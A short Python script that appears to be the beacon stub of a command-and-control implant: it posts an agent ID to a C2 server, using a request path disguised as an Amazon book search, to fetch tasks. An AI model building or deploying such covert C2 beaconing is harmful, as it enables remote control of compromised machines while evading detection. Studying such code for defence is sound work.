import requests
import json


C2SERVER = "http://127.0.0.1"
BEACONTIME = 3
URI = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books"
AGENTID = 99463333
C2URL = C2SERVER + URI
CURCMD = ''

# BEACON FOR TASKS
payload = {"type":"b","agentid": AGENTID}
beacon = requests.post(C2URL, data = json.dumps(payload))

print beacon.text
